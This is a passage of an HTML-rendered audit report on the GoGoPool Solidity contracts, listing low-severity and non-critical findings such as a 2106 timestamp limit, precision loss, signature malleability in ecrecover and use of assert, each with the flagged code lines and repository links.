width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑02] Contract will stop functioning in the year 2106</h2>\n<p>Limiting the timestamp to fit in a <code>uint32</code> will cause the call below to start reverting in 2106.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TokenggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:  \t\t</span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L89\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L89</a></p>\n<h2 id=\"l03-lower-level-initializations-should-come-first\" style=\"position:relative;\"><a href=\"#l03-lower-level-initializations-should-come-first\" aria-label=\"l03 lower level initializations should come first permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑03] Lower-level initializations should come first</h2>\n<p>There may not be an issue now, but if <code>ERC4626</code> changes to rely on some of the functions <code>BaseUpgradeable</code> provides, things will break.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TokenggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">   \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storageAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">   \t\t</span><span class=\"mtk11\">__ERC4626Upgradeable_init</span><span class=\"mtk1\">(</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;GoGoPool Liquid Staking Token&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;ggAVAX&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:  \t\t</span><span class=\"mtk11\">__BaseUpgradeable_init</span><span class=\"mtk1\">(</span><span class=\"mtk12\">storageAddress</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L72-L74\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L72-L74</a></p>\n<h2 id=\"l04-incorrect-percentage-conversion\" style=\"position:relative;\"><a href=\"#l04-incorrect-percentage-conversion\" aria-label=\"l04 incorrect percentage conversion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑04] Incorrect percentage conversion</h2>\n<p>0.2 ether should be 20%, not 2%. <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L44\">Other</a> areas use 0.X as X0%.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">: \t</span><span class=\"mtk3\">/// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L194\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L194</a></p>\n<h2 id=\"l05-loss-of-precision\" style=\"position:relative;\"><a href=\"#l05-loss-of-precision\" aria-label=\"l05 loss of precision permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑05] Loss of precision</h2>\n<p>Division by large numbers may result in the result being zero, due to solidity not supporting fractions. Consider requiring a minimum amount for the numerator to ensure that it is always larger than the denominator.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:   \t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getInflationIntervalSeconds</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">:  \t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getRewardsCycleSeconds</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L60\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L60</a></p>\n<h2 id=\"l06-signatures-vulnerable-to-malleability-attacks\" style=\"position:relative;\"><a href=\"#l06-signatures-vulnerable-to-malleability-attacks\" aria-label=\"l06 signatures vulnerable to malleability attacks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑06] Signatures vulnerable to malleability attacks</h2>\n<p><code>ecrecover()</code> accepts as valid, two versions of signatures, meaning an attacker can use the same signature twice. Consider adding checks for signature malleability, or using OpenZeppelin’s <code>ECDSA</code> library to perform the extra checks necessary in order to prevent this attack.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">upgradeable</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC20Upgradeable</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">   \t\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recoveredAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ecrecover</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">   \t\t\t\t</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">   \t\t\t\t\t</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">   \t\t\t\t\t\t</span><span class=\"mtk8\">&quot;</span><span class=\"mtk6\">\\x19\\x01</span><span class=\"mtk8\">&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">   \t\t\t\t\t\t</span><span class=\"mtk11\">DOMAIN_SEPARATOR</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">   \t\t\t\t\t\t</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">   \t\t\t\t\t\t\t</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">   \t\t\t\t\t\t\t\t</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">   \t\t\t\t\t\t\t\t</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">   \t\t\t\t\t\t\t\t</span><span class=\"mtk12\">spender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">   \t\t\t\t\t\t\t\t</span><span class=\"mtk12\">value</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">   \t\t\t\t\t\t\t\t</span><span class=\"mtk12\">nonces</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">]++,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">   \t\t\t\t\t\t\t\t</span><span class=\"mtk12\">deadline</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">   \t\t\t\t\t\t\t)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">   \t\t\t\t\t\t)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">   \t\t\t\t\t)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">   \t\t\t\t),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">149</span><span class=\"mtk1\">   \t\t\t\t</span><span class=\"mtk12\">v</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">   \t\t\t\t</span><span class=\"mtk12\">r</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">   \t\t\t\t</span><span class=\"mtk12\">s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">:  \t\t\t);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC20Upgradeable.sol#L132-L152\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC20Upgradeable.sol#L132-L152</a></p>\n<h2 id=\"l07-require-should-be-used-instead-of-assert\" style=\"position:relative;\"><a href=\"#l07-require-should-be-used-instead-of-assert\" aria-label=\"l07 require should be used instead of assert permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑07] <code>require()</code> should be used instead of <code>assert()</code></h2>\n<p>Prior to solidity version 0.8.0, hitting an assert consumes the <strong>remainder of the transaction’s available gas</strong> rather than returning it, as <code>require()</code>/<code>revert()</code> do. <code>assert()</code> should be avoided even past solidity version 0.8.0 as its <a href=\"https://docs.soliditylang.org/en/v0.8.14/control-structures.html#panic-via-assert-and-error-via-require\">documentation</a> states that “The assert function creates an error of type Panic(uint256). … Properly functioning code should never create a Panic, not even on invalid external input. If this happens, then there is a bug in your contract which you should fix”.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TokenggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:   \t\t</span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L83\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L83</a></p>\n<h2 id=\"n01-common-code-should-be-refactored\" style=\"position:relative;\"><a href=\"#n01-common-code-should-be-refactored\" aria-label=\"n01 common code should be refactored permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑01] Common code should be refactored</h2>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/BaseAbstract.sol#L71-L74\">BaseAbstract</a> performs similar operations, so the common code should be refactored to a function</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MultisigManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;multisig.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.address&quot;</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L110\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L110</a></p>\n<h2 id=\"n02-string-constants-used-in-multiple-places-should-be-defined-as-constants\" style=\"position:relative;\"><a href=\"#n02-string-constants-used-in-multiple-places-should-be-defined-as-constants\" aria-label=\"n02 string constants used in multiple places should be defined as constants permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑02] String constants used in multiple places should be defined as constants</h2>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MultisigManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;multisig.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.address&quot;</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L110\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L110</a></p>\n<h2 id=\"n03-constants-in-comparisons-should-appear-on-the-left-side\" style=\"position:relative;\"><a href=\"#n03-constants-in-comparisons-should-appear-on-the-left-side\" aria-label=\"n03 constants in comparisons should appear on the left side permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑03] Constants in comparisons should appear on the left side</h2>\n<p>Doing so will prevent <a href=\"https://www.moserware.com/2008/01/constants-on-left-are-better-but-this.html\">typo bugs</a>.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ClaimNodeOp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">92</span><span class=\"mtk1\">:  \t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ggpRewards</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L92\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L92</a></p>\n<h2 id=\"n04-inconsistent-address-separator-in-storage-names\" style=\"position:relative;\"><a href=\"#n04-inconsistent-address-separator-in-storage-names\" aria-label=\"n04 inconsistent address separator in storage names permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 